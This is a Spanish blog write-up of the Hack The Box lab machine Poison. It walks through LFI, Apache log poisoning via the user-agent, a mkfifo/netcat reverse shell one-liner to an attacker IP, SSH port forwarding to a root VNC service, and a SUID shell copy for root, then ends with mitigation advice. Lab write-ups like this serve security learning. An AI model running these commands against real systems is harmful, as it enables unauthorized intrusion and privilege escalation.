---
title: "Resolución de la máquina Poison"
date: 2026-3-02 20:00:00 +0100
categories: [Ciberseguridad,Maquina]
tags: [dificultad_medium, FreeBSD, log_poisoning,LFI]
description: "Máquina Poison de Hack The Box "
image:
  path: /assets/img/posts/WriteUpPoison/poison.png
  alt: "Información de Poison"
---
## Introducción

En este caso traigo el writeup de la maquina Poison de Hack The Box , hice esta maquina porque nunca habia hecho una maquina de FreeBSD y me daba curiosidad.No se diferencia mucho de Linux pero hay ciertas cosas que tenemos que tener en cuenta.

En esta maquina trataremos los siguientes temas:

- Log Poisoning 
  
- RCE
  
- Base64

- Escalada de privilegios usando servicio VNCViewer
  
- Local port forwarding


## 1 Reconocimiento

### 1.1 Escaneo de puertos

Empezamos con un escaneo general de todos los puertos abiertos de la maquina , para ello usaremos este comando:

    nmap -p- --open --min-rate=5000 -vvv -sS -n -Pn -oG allPorts 

Estos comandos estan explicados en el post de comandos basicos de [nmap](/posts/manual-nmap/)

![1772438373523](/assets/img/posts/WriteUpPoison/escaneogeneral.png)

Del escaneo sacamos que tiene abiertos los puertos 80 y 22 solamente, ahora procedemos a determinar las versiones de los servicios que estan corriendo.

    nmap -p22,80 -sCV -oN targeted 10.129.1.254

![1772438373523](/assets/img/posts/WriteUpPoison/escaneodetallado.png)

### 1.2 Reconocimiento web 

Del escaneo sacamos versiones pero nada mas importante asi que ahora vamos a ver la web que tiene expuesta.

![1772438373523](/assets/img/posts/WriteUpPoison/web.png)

A simple vista vemos que es una web para probar archivos php de la maquina , en este caso vemos en el burpsuite que si retrocedemos de ruta y probamos a leer el archivo /etc/passwd nos deja por lo tanto esto puede ser una via potencial de ataque si conseguimos RCE.

![1772438373523](/assets/img/posts/WriteUpPoison/lfi.png)

Para conseguir RCE primero trate de ver si podia leer logs ya que si nos permite , podremos inyectar codigo php y conseguir una webshell.

Aqui viene la primera diferencia de FreeBSD en cuanto a Linux.

En un sistema Linux Debian/Ubuntu la ruta de logs de Apache es **/var/log/apache2/access.log**

En un sistema FreeBSD es **/var/log/httpd-access.log**

Si probamos la ruta de los logs vemos que tenemos permiso para poder leer logs.

![1772438373523](/assets/img/posts/WriteUpPoison/logs.png)

Como en los logs se puede ver el user-agent de mi maquina atacante probé a sustituirlo por codigo php que ejecute un id en la maquina victima para ver si tenia una webshell


![1772438373523](/assets/img/posts/WriteUpPoison/logpoisoning.png)

Vemos que me dejaba por lo tanto ya teniamos una webshell ahora tocaba conseguir una reverse- shell como el usuario que ejecuta el servicio que en este caso es **www**.


## 2 Explotación

### 2.1 Shell como www

Probé diferentes comandos con netcat o reverse shell basicas pero en logs poisoning siempre suelen tener la versión incorrecta de netcat por lo tanto probé esta reverse shell que utiliza archivos fifo que mas adelante explicaré:

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f


![1772438373523](/assets/img/posts/WriteUpPoison/reverse_shell.png)

Envié el comando y conseguí una shell como **www**

En este caso use **rlwrap** con netcat ya que nos va a facilitar operar porque añade historial, flechas etc...

![1772438373523](/assets/img/posts/WriteUpPoison/reverseshell.png)


En el directorio del usuario vemos que tiene un archivo llamado **pwdbackup.txt**

![1772438373523](/assets/img/posts/WriteUpPoison/pwdbackup.png)


Dentro del archivo vemos un texto grande probablemente codificado en base64 por el = del final acompañado de una frase que dice que lo ha codificado 13 veces.

![1772438373523](/assets/img/posts/WriteUpPoison/clave.png)

Procedo a decodificarla en local 13 veces como dice el archivo y nos da una contraseña

![1772438373523](/assets/img/posts/WriteUpPoison/decodificada.png)

### 2.2 Shell como charix


En el **/etc/passwd** vemos que hay un usuario que se llama charix asi que pruebo a conectarme a ese usuario por ssh.

![1772438373523](/assets/img/posts/WriteUpPoison/charix.png)


Vemos que nos deja por lo tanto ya estamos como un usuario normal y podemos ver la flag del usuario charix.

![1772438373523](/assets/img/posts/WriteUpPoison/ssh.png)




En el directorio de **charix** vemos que hay un archivo secret.zip el cual nos llevaremos a nuestra máquina para descomprimirlo.



![1772438373523](/assets/img/posts/WriteUpPoison/secret.png)


Transferí el archivo usando netcat poniendome en escucha por el puerto 4444 en la maquina atacante y transfiriendo todo a un archivo secret.zip y en la maquina victima enviando a la ip de mi maquina atacante el archivo secret.zip


![1772438373523](/assets/img/posts/WriteUpPoison/transferencia.png)


Para descomprimirlo me pedía una contraseña , probé la del usuario charix y sirvió , dentro contenía un archivo llamado secret que no pude identificarlo ya que era un archivo vacío.

![1772438373523](/assets/img/posts/WriteUpPoison/descompresion.png)


## 3 Escalada de privilegios

### 3.1 Conexión a servicio XVNC como root

Enumerando el sistema me encontré que en los puertos que estaba usando la maquina había uno que no era normal.

![1772438373523](/assets/img/posts/WriteUpPoison/puertos.png)

En el puerto 5901 y 5801 había un servicio llamado xvnc corriendo como ROOT, esta podía ser un vector de ataque para una escalada de privilegios.


El servicio XVNC es para conexiones remotas a equipos por lo tanto si me conectaba , como el servicio corre como root , podria ser root.

Procedi a usar **local port forwarding** para enviar el trafico del puerto 5901 de la máquina victima a mi maquina atacante con el comando:

    ssh -L 5901:127.0.0.1:5901 charix@10.129.1.254

Con este comando y el parámetro -L indicamos que PUERTOLOCAL:IPDENUESTRAMAQUINA:PUERTODELAMAQUINAVICTIMA

![1772438373523](/assets/img/posts/WriteUpPoison/puertos2.png)

Vemos que ya esta escuchando nuestra maquina por ese puerto ahora probaré a conectarme con xvncviewer

Como xncviewer pide contraseña y no iba la que conseguimos la primera vez , investigue y con el parametro -paswd podiamos usar un archivo con contraseña asi que use el que descomprimimos y fue 

    xvncviewer 127.0.0.1:5901 -passwd secret

![1772438373523](/assets/img/posts/WriteUpPoison/root.png)


### 3.2 Bash como root


Tenicamente estabamos ya como root pero no se podía operar bien asi que le di permiso uid a una /bin/sh de la maquina y como estaba conectado como charix podria ser root.

Hice una copia de /bin/sh en el directorio de charix

![1772438373523](/assets/img/posts/WriteUpPoison/copiash.png)


Le di permiso SUID a la bash y como el archivo es propiedad de root si lo ejecuta charix debería obtener acceso como root.

![1772438373523](/assets/img/posts/WriteUpPoison/suidbash.png)


Lo ejecute estando conectado por ssh como charix y ya era root

![1772438373523](/assets/img/posts/WriteUpPoison/bashcomoroot.png)


## 4 Mitigación de vectores de ataque


### 4.1 Vectores de ataques usados en reconocimiento

- En el reconocimiento web . en cuanto al path traversal  y el lfi sería implementar una buena logica con php ya que seguramente se haya usado el clasico include($_GET['page']); para incluir browse.php , esto es vulnerable , por lo tanto se debe cambiar y realizar validaciones de ruta.
  
- Para evitar Log Poisoning el usuario que corre el servicio web no debe tener permiso de lectura de logs , solo de escritura.


### 4.2 Vectores de ataque usados en explotación

- En la explotación , tener una copia de la contraseña codificada en base64 o en general una copia de una contraseña no es buena idea.
  
- Reutilizar la contraseña del usuario para un archivo zip tampoco se debería hacer.

- Por ultimo no tendria que haber una copia de el archivo de autenticacion de xvnc en la misma maquina.
  


### 4.3 Vectores de ataque usados en Escalada de privilegios


 - Dejar el servicio xvnc corriendo como root no es una buena practica de seguridad , lo mas recomendable es no dejarlo encendido ya que existen otros protocolos mas seguros como ssh para la administración remota.
  

